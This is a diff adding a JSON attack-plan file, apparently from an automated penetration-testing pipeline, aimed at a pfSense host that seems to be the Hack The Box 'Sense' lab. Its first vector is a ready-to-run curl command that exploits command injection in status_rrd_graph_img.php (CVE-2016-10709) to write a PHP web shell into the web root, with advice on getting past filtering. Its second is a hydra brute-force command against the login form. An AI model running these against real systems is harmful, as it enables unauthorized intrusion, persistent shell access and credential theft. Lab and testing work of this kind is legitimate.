@@ -1,0 +1,85 @@
+{
+  "plan_id": "plan_1735132000_001",
+  "target_ip": "10.129.2.244",
+  "context_hash": "pfsense_lighttpd_rce_manual",
+  "attack_vectors": [
+    {
+      "vector_id": "vec_01",
+      "priority": 1,
+      "action": {
+        "tool_name": "custom_exploit",
+        "command_template": "curl -k 'https://{target}/status_rrd_graph_img.php?database=queues;cd+..;cd+..;cd+..;cd+usr;cd+local;cd+www;echo+\"{base64_php}\">shell.php'",
+        "parameters": {
+          "target": "10.129.2.244",
+          "base64_php": "<?php system($_GET['cmd']); ?> | base64 encoded"
+        },
+        "timeout_seconds": 30
+      },
+      "prediction_metrics": {
+        "classification": {
+          "attack_type": "RCE",
+          "mitre_id": "T1190",
+          "cve_id": "CVE-2016-10709"
+        },
+        "hypothesis": {
+          "confidence_score": 0.9,
+          "rationale_tags": [
+            "pfsense_confirmed",
+            "lighttpd_1.4.35",
+            "manual_technique",
+            "bypass_filtering"
+          ],
+          "expected_success": true
+        },
+        "success_criteria": {
+          "match_type": "http_response",
+          "match_pattern": "(200 OK|shell created)",
+          "negative_pattern": "(404 Not Found|Access Denied|Forbidden)"
+        }
+      },
+      "rag_context": {
+        "payload_snippet": "/status_rrd_graph_img.php?database=queues;cd+..;cd+..;cd+..;cd+usr;cd+local;cd+www;echo+",
+        "insight": "Public exploit 38 and 39709 for pfSense are unreliable due to strict input filtering. Manual exploitation with Base64-encoded PHP payload is necessary.",
+        "exploitation_logic": "Command injection in 'database' parameter using Base64 encoding to bypass filtering mechanisms and achieve RCE",
+        "vulnerability_context": "pfSense RCE vulnerability via command injection in status_rrd_graph_img.php parameter",
+        "source": "htb_sense1_writeup"
+      }
+    },
+    {
+      "vector_id": "vec_02",
+      "priority": 2,
+      "action": {
+        "tool_name": "credential_bruteforce",
+        "command_template": "hydra -L {userlist} -P {passlist} https-post-form://{target}/index.php:__csrf_magic={csrf}&usernamefld={user}&passwordfld={pass}:Username or Password incorrect",
+        "parameters": {
+          "target": "10.129.2.244",
+          "userlist": "common_users.txt",
+          "passlist": "common_passwords.txt"
+        },
+        "timeout_seconds": 300
+      },
+      "prediction_metrics": {
+        "classification": {
+          "attack_type": "Credential Access",
+          "mitre_id": "T1110",
+          "cve_id": "N/A"
+        },
+        "hypothesis": {
+          "confidence_score": 0.3,
+          "rationale_tags": [
+            "default_creds",
+            "weak_passwords",
+            "admin_interface"
+          ],
+          "expected_success": false
+        },
+        "success_criteria": {
+          "match_type": "string_absence",
+          "match_pattern": "Username or Password incorrect",
+          "negative_pattern": "(rate limited|account locked)"
+        }
+      }
+    }
+  ],
+  "created_at": "2024-12-25T14:00:00Z"
+}
